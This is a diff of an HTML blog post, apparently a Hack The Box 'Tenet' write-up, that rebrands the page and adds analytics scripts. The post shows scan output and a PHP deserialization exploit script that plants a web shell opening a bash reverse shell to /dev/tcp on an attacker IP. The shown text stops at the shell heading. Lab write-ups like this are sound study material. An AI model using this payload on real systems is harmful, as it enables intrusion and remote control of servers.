@@ -1,264 +1,266 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    
-      <title>
-        Exploiting PHP deserialization 🔐 ::
-        bhavsec — portfolio &amp; blog
-      </title>
-    
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta
-  name="description"
-  content="Intro to Insecure deserialization Serialization is when an object in a programming language (say, a Java or PHP object) is converted into a format that can be stored or transferred. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.
-Insecure deserialization vulnerabilities happen when applications deserialize objects without proper sanitization. An attacker can then manipulate serialized objects to change the program’s flow."
-/>
-<meta
-  name="keywords"
-  content="bhavsec, cybersecurity, penetration testing"
-/>
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://bhavsec.com/posts/php-deserialization/" />
 
-
-
-
-
-<link rel="stylesheet" href="../../assets/style.css" />
-
-<link rel="stylesheet" href="../../style.css" />
-
-
-<link
-  rel="apple-touch-icon-precomposed"
-  sizes="144x144"
-  href="../../img/apple-touch-icon-144-precomposed.png"
-/>
-<link rel="shortcut icon" href="../../img/favicon.png" />
-
-
-<link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-
-
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://bhavsec.com/img/cover.png"/>
-
-<meta name="twitter:title" content="Exploiting PHP deserialization 🔐"/>
-<meta name="twitter:description" content="Intro to Insecure deserialization Serialization is when an object in a programming language (say, a Java or PHP object) is converted into a format that can be stored or transferred. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.
-Insecure deserialization vulnerabilities happen when applications deserialize objects without proper sanitization. An attacker can then manipulate serialized objects to change the program’s flow."/>
-
-
-
-<meta property="og:title" content="Exploiting PHP deserialization 🔐" />
-<meta property="og:description" content="Intro to Insecure deserialization Serialization is when an object in a programming language (say, a Java or PHP object) is converted into a format that can be stored or transferred. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.
+<head>
+  <title>Exploiting PHP deserialization 🔐 — Waseem Akram</title>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description"
+    content="Intro to Insecure deserialization Serialization is when an object in a programming language (say, a Java or PHP object) is converted into a format that can be stored or transferred. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.
 Insecure deserialization vulnerabilities happen when applications deserialize objects without proper sanitization. An attacker can then manipulate serialized objects to change the program’s flow." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://bhavsec.com/posts/php-deserialization/" /><meta property="og:image" content="https://bhavsec.com/img/cover.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-05-26T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2021-05-26T00:00:00&#43;00:00" /><meta property="og:site_name" content="bhavsec" />
+  <meta name="keywords" content="hackerwasii, cybersecurity, penetration testing" />
+  <meta name="robots" content="noodp" />
+  <link rel="canonical" href="https://www.hackerwasii.com/posts/php-deserialization/" />
 
+  <link rel="stylesheet" href="../../assets/style.css" />
 
+  <link rel="stylesheet" href="../../style.css" />
 
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../../img/apple-touch-icon-144-precomposed.png" />
+  <link rel="shortcut icon" href="../../img/favicon.png" />
 
+  <link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
+  <link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="" />
 
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://www.hackerwasii.com/img/cover.png" />
 
+  <meta name="twitter:title" content="Exploiting PHP deserialization 🔐" />
+  <meta name="twitter:description"
+    content="Intro to Insecure deserialization Serialization is when an object in a programming language (say, a Java or PHP object) is converted into a format that can be stored or transferred. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.
+Insecure deserialization vulnerabilities happen when applications deserialize objects without proper sanitization. An attacker can then manipulate serialized objects to change the program’s flow." />
 
-  </head>
-  <body class="">
-    <div class="container">
-      <header class="header">
-  <span class="header__inner">
-    <a
-  href="http://bhavsec.com/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text">
-      bhavsec/</span>
-    <span class="logo__text" style="color:red">posts/</span>
-    <span class="logo__cursor"></span>
+  <meta property="og:title" content="Exploiting PHP deserialization 🔐" />
+  <meta property="og:description"
+    content="Intro to Insecure deserialization Serialization is when an object in a programming language (say, a Java or PHP object) is converted into a format that can be stored or transferred. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.
+Insecure deserialization vulnerabilities happen when applications deserialize objects without proper sanitization. An attacker can then manipulate serialized objects to change the program’s flow." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://www.hackerwasii.com/posts/php-deserialization/" />
+  <meta property="og:image" content="https://www.hackerwasii.com/img/cover.png" />
+  <meta property="article:section" content="posts" />
+  <meta property="article:published_time" content="2021-05-26T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2021-05-26T00:00:00&#43;00:00" />
+  <meta property="og:site_name" content="hackerwasii" />
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0PCVFG8BNK"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
 
-  
-</a>
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
 
-    <span class="header__right">
-      
-        <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="../../resume">📄 resume</a></li>
-        
-      
-        
-          <li><a href="../../posts">📚 blog</a></li>
-        
-      
-        
-          <li><a href="../../whoami">🔎 whoami </a></li>
-        
-      
-        
-          <li><a href="../../resources">🚀 resources</a></li>
-        
-      
-      
-      
-  </ul>
+    gtag('config', 'G-0PCVFG8BNK');
+  </script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9670252621494000"
+    crossorigin="anonymous"></script>
+</head>
 
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="../../resume">📄 resume</a></li>
-      
-    
-      
-        <li><a href="../../posts">📚 blog</a></li>
-      
-    
-      
-        <li><a href="../../whoami">🔎 whoami </a></li>
-      
-    
-      
-        <li><a href="../../resources">🚀 resources</a></li>
-      
-    
-  </ul>
-</nav>
+<body class="">
+  <div class="container">
+    <header class="header">
+      <span class="header__inner">
+        <a href="https://www.hackerwasii.com/" class="logo" style="text-decoration: none">
+          <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+              <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+            </svg>
+          </span>
+          <span class="logo__text"> wasii/</span>
+          <span class="logo__text" style="color: red">posts/</span>
+          <span class="logo__cursor"></span>
+        </a>
 
-        <span class="menu-trigger">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-            <path d="M0 0h24v24H0z" fill="none" />
-            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-          </svg>
-        </span>
-      
-      <span class="theme-toggle">
-        <svg
-  class="theme-toggler"
-  width="24"
-  height="24"
-  viewBox="0 0 48 48"
-  fill="none"
-  xmlns="http://www.w3.org/2000/svg"
->
-  <path
-    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+        <span class="header__right">
+          <nav class="menu">
+            <ul class="menu__inner menu__inner--desktop">
+              <li><a href="../../resume">📄 resume</a></li>
+
+              <li><a href="../../posts">📚 blog</a></li>
+
+              <li><a href="../../whoami">🔎 whoami </a></li>
+
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+
+            <ul class="menu__inner menu__inner--mobile">
+              <li><a href="../../resume">📄 resume</a></li>
+
+              <li><a href="../../posts">📚 blog</a></li>
+
+              <li><a href="../../whoami">🔎 whoami </a></li>
+
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+          </nav>
+
+          <span class="menu-trigger">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M0 0h24v24H0z" fill="none" />
+              <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+            </svg>
+          </span>
+
+          <span class="theme-toggle">
+            <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"
+              xmlns="http://www.w3.org/2000/svg">
+              <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
-  />
-</svg>
-
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z" />
+            </svg>
+          </span>
+        </span>
       </span>
-    </span>
-  </span>
-</header>
+    </header>
 
+    <div class="content">
+      <div class="post">
+        <h1 class="post-title">Exploiting PHP deserialization 🔐</h1>
+        <div class="post-meta">
+          <span class="post-date"> 2021-05-26 </span>
+        </div>
 
-      <div class="content">
-        
-  
-  
+        <span class="post-tags">
+          <a href="../../tags/htb/index.html">#htb</a>&nbsp;
 
-  <div class="post">
-    <h1 class="post-title">Exploiting PHP deserialization 🔐</h1>
-    <div class="post-meta">
-      
-        <span class="post-date">
-          2021-05-26
+          <a href="../../tags/php/index.html">#php</a>&nbsp;
+
+          <a href="../../tags/windows/index.html">#windows</a>&nbsp;
+
+          <a href="../../tags/wordpress/index.html">#wordpress</a>&nbsp;
         </span>
 
-        
-          
-        
-      
+        <div class="post-content">
+          <h2>Table of Contents</h2>
+          <aside class="table-of-contents">
+            <nav id="TableOfContents">
+              <ul>
+                <li>
+                  <a href="index.html#intro-to-insecure-deserialization">Intro to Insecure deserialization</a>
+                </li>
+                <li>
+                  <a href="index.html#enumeration">Enumeration</a>
+                  <ul>
+                    <li>
+                      <a href="index.html#nmap-results">nmap results</a>
+                    </li>
+                    <li>
+                      <a href="index.html#gobuster-results">gobuster results</a>
+                    </li>
+                    <li>
+                      <a href="index.html#wpscan-results">WPScan results</a>
+                    </li>
+                    <li>
+                      <a href="index.html#users-revealed-in-wpscan">Users Revealed in WPScan</a>
+                    </li>
+                    <li>
+                      <a href="index.html#wordpress-application-running-on-port-80">Wordpress Application running on
+                        port 80</a>
+                    </li>
+                    <li>
+                      <a href="index.html#in-some-comment-neil-user-talking-about-sator-php-file-and-the-backup">In Some
+                        comment neil user talking about sator php
+                        file and the backup</a>
+                    </li>
+                    <li>
+                      <a href="index.html#lets-add-satorphp-in-url-and-check-any-file-there-or-not">Let&rsquo;s add
+                        sator.php in url and check any file
+                        there or not.</a>
+                    </li>
+                    <li>
+                      <a href="index.html#lets-replace-domain-name-with-ip-address">Let&rsquo;s replace Domain name with
+                        IP Address</a>
+                    </li>
+                    <li>
+                      <a href="index.html#backup-file-found-in-the-same-directory">Backup file found in the same
+                        directory</a>
+                    </li>
+                    <li>
+                      <a href="index.html#satorphpbak-file">Sator.php.bak file</a>
+                    </li>
+                  </ul>
+                </li>
+                <li>
+                  <a href="index.html#exploitation">Exploitation</a>
+                  <ul>
+                    <li>
+                      <a href="index.html#we-got-the-shell">We got the shell</a>
+                    </li>
+                    <li>
+                      <a href="index.html#lets-go-to-wordpress-directory-and-view-content-of-wp-configphp">Let&rsquo;s
+                        go to wordpress directory and view
+                        content of wp-config.php</a>
+                    </li>
+                    <li>
+                      <a href="index.html#ssh-login-successful">SSH Login Successful</a>
+                    </li>
+                    <li><a href="index.html#user-owned">User Owned</a></li>
+                  </ul>
+                </li>
+                <li>
+                  <a href="index.html#privilege-escalation">Privilege Escalation</a>
+                  <ul>
+                    <li>
+                      <a href="index.html#sudo--l-results">sudo -l results</a>
+                    </li>
+                    <li>
+                      <a href="index.html#enablesshsh-file">enableSSH.sh file</a>
+                    </li>
+                    <li>
+                      <a href="index.html#the-addkey-function-look-interesting">The addkey() function look
+                        interesting.</a>
+                    </li>
+                    <li>
+                      <a href="index.html#lets-see-whats-the-script-doing">Let&rsquo;s see what&rsquo;s the script
+                        doing.</a>
+                    </li>
+                    <li>
+                      <a href="index.html#copy-our-ssh-public-key-from-kali-machine">Copy our SSH Public key from kali
+                        machine</a>
+                    </li>
+                    <li><a href="index.html#root-owned">Root Owned</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </nav>
+          </aside>
 
-      
-
-
-      
-    </div>
-
-    
-      <span class="post-tags">
-        
-          <a href="../../tags/htb/index.html">#htb</a>&nbsp;
-        
-          <a href="../../tags/php/index.html">#php</a>&nbsp;
-        
-          <a href="../../tags/windows/index.html">#windows</a>&nbsp;
-        
-          <a href="../../tags/wordpress/index.html">#wordpress</a>&nbsp;
-        
-      </span>
-    
-
-    
-
-    <div class="post-content">
-      
-        
-        <h2>Table of Contents</h2>
-        <aside class="table-of-contents"><nav id="TableOfContents">
-  <ul>
-    <li><a href="index.html#intro-to-insecure-deserialization">Intro to Insecure deserialization</a></li>
-    <li><a href="index.html#enumeration">Enumeration</a>
-      <ul>
-        <li><a href="index.html#nmap-results">nmap results</a></li>
-        <li><a href="index.html#gobuster-results">gobuster results</a></li>
-        <li><a href="index.html#wpscan-results">WPScan results</a></li>
-        <li><a href="index.html#users-revealed-in-wpscan">Users Revealed in WPScan</a></li>
-        <li><a href="index.html#wordpress-application-running-on-port-80">Wordpress Application running on port 80</a></li>
-        <li><a href="index.html#in-some-comment-neil-user-talking-about-sator-php-file-and-the-backup">In Some comment neil user talking about sator php file and the backup</a></li>
-        <li><a href="index.html#lets-add-satorphp-in-url-and-check-any-file-there-or-not">Let&rsquo;s add sator.php in url and check any file there or not.</a></li>
-        <li><a href="index.html#lets-replace-domain-name-with-ip-address">Let&rsquo;s replace Domain name with IP Address</a></li>
-        <li><a href="index.html#backup-file-found-in-the-same-directory">Backup file found in the same directory</a></li>
-        <li><a href="index.html#satorphpbak-file">Sator.php.bak file</a></li>
-      </ul>
-    </li>
-    <li><a href="index.html#exploitation">Exploitation</a>
-      <ul>
-        <li><a href="index.html#we-got-the-shell">We got the shell</a></li>
-        <li><a href="index.html#lets-go-to-wordpress-directory-and-view-content-of-wp-configphp">Let&rsquo;s go to wordpress directory and view content of wp-config.php</a></li>
-        <li><a href="index.html#ssh-login-successful">SSH Login Successful</a></li>
-        <li><a href="index.html#user-owned">User Owned</a></li>
-      </ul>
-    </li>
-    <li><a href="index.html#privilege-escalation">Privilege Escalation</a>
-      <ul>
-        <li><a href="index.html#sudo--l-results">sudo -l results</a></li>
-        <li><a href="index.html#enablesshsh-file">enableSSH.sh file</a></li>
-        <li><a href="index.html#the-addkey-function-look-interesting">The addkey() function look interesting.</a></li>
-        <li><a href="index.html#lets-see-whats-the-script-doing">Let&rsquo;s see what&rsquo;s the script doing.</a></li>
-        <li><a href="index.html#copy-our-ssh-public-key-from-kali-machine">Copy our SSH Public key from kali machine</a></li>
-        <li><a href="index.html#root-owned">Root Owned</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav></aside>
-        
-      
-      <h2 id="intro-to-insecure-deserialization">Intro to Insecure deserialization</h2>
-<p>Serialization is when an object in a programming language (say, a Java or PHP object) is converted into a format that can be stored or transferred. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.</p>
-<p>Insecure deserialization vulnerabilities happen when applications deserialize objects without proper sanitization. An attacker can then manipulate serialized objects to change the program’s flow.</p>
-<p>Today, let’s talk about PHP object injections. They are insecure deserialization vulnerabilities that happen when developers deserialize PHP objects recklessly.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="nmap-results">nmap results</h3>
-<pre><code>nmap -sC -sV -O nmap/tenet 10.129.158.233
-</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Nmap 7.91 scan initiated Wed May 26 23:31:44 2021 as: nmap -sC -sV -oA nmap/tenet 10.129.158.233</span>
+          <h2 id="intro-to-insecure-deserialization">
+            Intro to Insecure deserialization
+          </h2>
+          <p>
+            Serialization is when an object in a programming language (say, a
+            Java or PHP object) is converted into a format that can be stored
+            or transferred. Whereas deserialization refers to the opposite:
+            it’s when the serialized object is read from a file or the network
+            and converted back into an object.
+          </p>
+          <p>
+            Insecure deserialization vulnerabilities happen when applications
+            deserialize objects without proper sanitization. An attacker can
+            then manipulate serialized objects to change the program’s flow.
+          </p>
+          <p>
+            Today, let’s talk about PHP object injections. They are insecure
+            deserialization vulnerabilities that happen when developers
+            deserialize PHP objects recklessly.
+          </p>
+          <h2 id="enumeration">Enumeration</h2>
+          <h3 id="nmap-results">nmap results</h3>
+          <pre><code>nmap -sC -sV -O nmap/tenet 10.129.158.233
+</code></pre>
+          <div class="highlight">
+            <pre style="
+                  color: #f8f8f2;
+                  background-color: #272822;
+                  -moz-tab-size: 4;
+                  -o-tab-size: 4;
+                  tab-size: 4;
+                "><code class="language-python" data-lang="python"><span style="color:#75715e"># Nmap 7.91 scan initiated Wed May 26 23:31:44 2021 as: nmap -sC -sV -oA nmap/tenet 10.129.158.233</span>
 Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.129.158.233</span>
 Host <span style="color:#f92672">is</span> up (<span style="color:#ae81ff">0.023</span>s latency)<span style="color:#f92672">.</span>
 Not shown: <span style="color:#ae81ff">998</span> closed ports
@@ -276,9 +278,12 @@ Service Info: OS: Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:li
 Service detection performed<span style="color:#f92672">.</span> Please report any incorrect results at https:<span style="color:#f92672">//</span>nmap<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>submit<span style="color:#f92672">/</span> <span style="color:#f92672">.</span>
 <span style="color:#75715e"># Nmap done at Wed May 26 23:31:52 2021 -- 1 IP address (1 host up) scanned in 8.08 seconds</span>
                               
-</code></pre></div><h3 id="gobuster-results">gobuster results</h3>
-<pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://tenet.htb
-</code></pre><pre><code>===============================================================
+</code></pre>
+          </div>
+          <h3 id="gobuster-results">gobuster results</h3>
+          <pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://tenet.htb
+</code></pre>
+          <pre><code>===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 ===============================================================
@@ -295,9 +300,18 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 /wp-content           (Status: 301) [Size: 311] [--&gt; http://tenet.htb/wp-content/]
 /wp-includes          (Status: 301) [Size: 312] [--&gt; http://tenet.htb/wp-includes/]
 /wp-admin             (Status: 301) [Size: 309] [--&gt; http://tenet.htb/wp-admin/]
-</code></pre><h3 id="wpscan-results">WPScan results</h3>
-<pre><code>wpscan -e u --url http://tenet.htb
-</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Interesting Finding(s):
+</code></pre>
+          <h3 id="wpscan-results">WPScan results</h3>
+          <pre><code>wpscan -e u --url http://tenet.htb
+</code></pre>
+          <div class="highlight">
+            <pre style="
+                  color: #f8f8f2;
+                  background-color: #272822;
+                  -moz-tab-size: 4;
+                  -o-tab-size: 4;
+                  tab-size: 4;
+                "><code class="language-python" data-lang="python">Interesting Finding(s):
 
 [<span style="color:#f92672">+</span>] Headers
  <span style="color:#f92672">|</span> Interesting Entry: Server: Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4.29</span> (Ubuntu)
@@ -380,25 +394,65 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 [<span style="color:#f92672">+</span>] Data Received: <span style="color:#ae81ff">13.827</span> MB
 [<span style="color:#f92672">+</span>] Memory used: <span style="color:#ae81ff">160.836</span> MB
 [<span style="color:#f92672">+</span>] Elapsed time: <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">02</span>
-</code></pre></div><h3 id="users-revealed-in-wpscan">Users Revealed in WPScan</h3>
-<pre><code>neil
+</code></pre>
+          </div>
+          <h3 id="users-revealed-in-wpscan">Users Revealed in WPScan</h3>
+          <pre><code>neil
 protagonist
-</code></pre><h3 id="wordpress-application-running-on-port-80">Wordpress Application running on port 80</h3>
-<p><img src="http://bhavsec.com/img/posts/php-deserialization/image-20210526234823652.png" alt="image-20210526234823652"></p>
-<h3 id="in-some-comment-neil-user-talking-about-sator-php-file-and-the-backup">In Some comment neil user talking about sator php file and the backup</h3>
-<p><img src="http://bhavsec.com/img/posts/php-deserialization//image-20210526234749550.png" alt="image-20210526234749550"></p>
-<h3 id="lets-add-satorphp-in-url-and-check-any-file-there-or-not">Let&rsquo;s add sator.php in url and check any file there or not.</h3>
-<p><img src="http://bhavsec.com/img/posts/php-deserialization/image-20210526235225921.png" alt="image-20210526235225921"></p>
-<h3 id="lets-replace-domain-name-with-ip-address">Let&rsquo;s replace Domain name with IP Address</h3>
-<p><img src="http://bhavsec.com/img/posts/php-deserialization/image-20210526235043185.png" alt="image-20210526235043185"></p>
-<h3 id="backup-file-found-in-the-same-directory">Backup file found in the same directory</h3>
-<p>If you remember, neil taking about backup Let&rsquo;s find that <code>backup</code> file. most developers change backup file into <code>.bak</code> format.</p>
-<blockquote>
-<p>Link: http://10.129.158.233/sator.php.bak</p>
-</blockquote>
-<p><img src="http://bhavsec.com/img/posts/php-deserialization/image-20210527110904042.png" alt="image-20210527110904042"></p>
-<h3 id="satorphpbak-file">Sator.php.bak file</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</code></pre>
+          <h3 id="wordpress-application-running-on-port-80">
+            Wordpress Application running on port 80
+          </h3>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/php-deserialization/image-20210526234823652.png"
+              alt="image-20210526234823652" />
+          </p>
+          <h3 id="in-some-comment-neil-user-talking-about-sator-php-file-and-the-backup">
+            In Some comment neil user talking about sator php file and the
+            backup
+          </h3>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/php-deserialization//image-20210526234749550.png"
+              alt="image-20210526234749550" />
+          </p>
+          <h3 id="lets-add-satorphp-in-url-and-check-any-file-there-or-not">
+            Let&rsquo;s add sator.php in url and check any file there or not.
+          </h3>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/php-deserialization/image-20210526235225921.png"
+              alt="image-20210526235225921" />
+          </p>
+          <h3 id="lets-replace-domain-name-with-ip-address">
+            Let&rsquo;s replace Domain name with IP Address
+          </h3>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/php-deserialization/image-20210526235043185.png"
+              alt="image-20210526235043185" />
+          </p>
+          <h3 id="backup-file-found-in-the-same-directory">
+            Backup file found in the same directory
+          </h3>
+          <p>
+            If you remember, neil taking about backup Let&rsquo;s find that
+            <code>backup</code> file. most developers change backup file into
+            <code>.bak</code> format.
+          </p>
+          <blockquote>
+            <p>Link: http://10.129.158.233/sator.php.bak</p>
+          </blockquote>
+          <p>
+            <img src="https://www.hackerwasii.com/img/posts/php-deserialization/image-20210527110904042.png"
+              alt="image-20210527110904042" />
+          </p>
+          <h3 id="satorphpbak-file">Sator.php.bak file</h3>
+          <div class="highlight">
+            <pre style="
+                  color: #f8f8f2;
+                  background-color: #272822;
+                  -moz-tab-size: 4;
+                  -o-tab-size: 4;
+                  tab-size: 4;
+                "><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
 {
@@ -428,17 +482,44 @@ $app <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">update
 
 
 <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>After <code>analyze</code> the code we see that the script looks for a GET input variable <code>arepo</code> and unserializes it. we might be able to exploit it using <code>PHP Object Deserialization</code> and the class called <code>DatabaseExport</code>with a <code>__destruct</code> function This function is what we can use to get <code>RCE</code>. The function uses <code>file_put_contents</code> to write the variable data to the file defined in the variable <code>user_file</code>.</p>
-<blockquote>
-<p><code>Link</code> : <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">Exploiting PHP deserialization</a></p>
-</blockquote>
-<h2 id="exploitation">Exploitation</h2>
-<p>So with the help of the <code>article</code> we write the class <code>DatabaseExport</code> on our local machine, define <code>user_file</code> to be a php file and the data to be a <code>php_reverse_shell</code> to our local machine.</p>
-<p>Now let&rsquo;s create a <code>php</code> script.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></code></pre>
+          </div>
+          <p>
+            After <code>analyze</code> the code we see that the script looks
+            for a GET input variable <code>arepo</code> and unserializes it.
+            we might be able to exploit it using
+            <code>PHP Object Deserialization</code> and the class called
+            <code>DatabaseExport</code>with a <code>__destruct</code> function
+            This function is what we can use to get <code>RCE</code>. The
+            function uses <code>file_put_contents</code> to write the variable
+            data to the file defined in the variable <code>user_file</code>.
+          </p>
+          <blockquote>
+            <p>
+              <code>Link</code> :
+              <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">Exploiting PHP
+                deserialization</a>
+            </p>
+          </blockquote>
+          <h2 id="exploitation">Exploitation</h2>
+          <p>
+            So with the help of the <code>article</code> we write the class
+            <code>DatabaseExport</code> on our local machine, define
+            <code>user_file</code> to be a php file and the data to be a
+            <code>php_reverse_shell</code> to our local machine.
+          </p>
+          <p>Now let&rsquo;s create a <code>php</code> script.</p>
+          <div class="highlight">
+            <pre style="
+                  color: #f8f8f2;
+                  background-color: #272822;
+                  -moz-tab-size: 4;
+                  -o-tab-size: 4;
+                  tab-size: 4;
+                "><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
 {
-    <span style="color:#66d9ef">public</span> $user_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bhavsec.php&#39;</span>;
+    <span style="color:#66d9ef">public</span> $user_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hackerwasii.php&#39;</span>;
     <span style="color:#66d9ef">public</span> $data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php exec(&#34;/bin/bash -c \&#39;bash -i &gt; /dev/tcp/10.10.14.172/9001 0&gt;&amp;1\&#39;&#34;); ?&gt;&#39;</span>;
 
         <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
@@ -450,23 +531,29 @@ $app <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">update
 
 $url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://10.129.158.233/sator.php?arepo=&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>));
 $response <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$url</span><span style="color:#e6db74">&#34;</span>);
-$response <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;http://10.129.158.233/bhavsec.php&#34;</span>);
+$response <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;http://10.129.158.233/hackerwasii.php&#34;</span>);
 
 <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><h3 id="we-got-the-shell">We got the shell</h3>
-<pre><code>┌──(root💀kali)-[~/htb/tenet]
+</span></code></pre>
+          </div>
+          <h3 id="we-got-the-shell">We got the shell</h3>
